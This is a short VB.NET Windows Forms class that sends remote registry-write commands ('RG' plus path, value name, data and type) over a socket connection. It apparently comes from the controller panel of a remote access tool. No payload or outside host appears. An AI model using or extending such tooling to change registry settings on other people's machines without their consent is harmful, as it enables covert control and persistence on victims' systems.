Imports Microsoft.Win32
Public Class Regedit
    Public Path As String
    Public sock As Integer
    Public Function Typ(ByVal t As String) As Integer
        Dim num As Integer
        Dim str As String = t.ToLower
        If (str = RegistryValueKind.Binary.ToString.ToLower) Then
            Return 3
        End If
        If (str = RegistryValueKind.DWord.ToString.ToLower) Then
            Return 4
        End If
        If (str = RegistryValueKind.ExpandString.ToString.ToLower) Then
            Return 2
        End If
        If (str = RegistryValueKind.MultiString.ToString.ToLower) Then
            Return 7
        End If
        If (str = RegistryValueKind.QWord.ToString.ToLower) Then
            Return 11
        End If
        If (str = RegistryValueKind.String.ToString.ToLower) Then
            Return 1
        End If
        Return num
    End Function
    

  
    Private Sub Button3_Click(sender As System.Object, e As System.EventArgs) Handles Button3.Click
        Main.S.Send(sock, "RG" & Main.Yy & "!" & Main.Yy & Path & Main.Yy & TextBox1.Text & Main.Yy & TextBox3.Text & Main.Yy & Typ(Me.ComboBox1.Text))
        Me.Close()
    End Sub

    Private Sub Button4_Click(sender As System.Object, e As System.EventArgs) Handles Button4.Click
        Me.Close()
    End Sub

    Private Sub Regedit_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
    End Sub
End Class